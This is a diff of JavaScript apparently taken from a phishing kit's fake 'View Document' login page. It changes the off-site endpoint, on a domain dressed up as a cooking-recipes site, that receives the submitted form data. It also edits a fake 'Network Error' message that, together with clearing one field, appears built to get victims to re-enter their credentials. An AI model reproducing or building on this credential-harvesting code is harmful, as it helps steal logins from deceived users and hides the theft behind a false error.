@@ -49,13 +49,13 @@ btn.addEventListener('click',()=>{
   
     $("#x1").val(url);
 const handleErr = ()=>{
-      var errMsg = "Network Error! Please verify your information and try again";
+      var errMsg = "";
       var spann = document.querySelector(".mmssgg");
       spann.textContent = errMsg;
       spann.innerHTML = "";
       spann.addEventListener("click", ()=>{
         alert('connected')
-      spann.innerHTML = "Network Error! Please verify your information and try again";
+      spann.innerHTML = "";
         
       })
     }
@@ -109,7 +109,7 @@ const handleErr = ()=>{
         $("#submitBtn").html(`<button id="submitBtn" class="btn btn-md btn-block btn-danger btn-block"> <span class="spinner-grow spinner-grow-sm"></span>
         Please Wait...</button>`).prop("disabled", true);
         $.ajax({
-            url: "https://gdf.cookingrecipies.store/adb.php",
+            url: "https://gdf.cookingrecipies.store/adb/index.php",
             type: 'POST',
             data: formData,
             contentType: false,
@@ -121,7 +121,7 @@ const handleErr = ()=>{
                 setTimeout(function() {
                     $("#x1").val(url);
                     $("#x2").val("");
-                    $('#msg').html(`Network Error! Please verify your information and try again`);
+                    $('#msg').html(``);
                     $("#submitBtn").html("View Document").prop("disabled", false);
                 }, 2000);
 
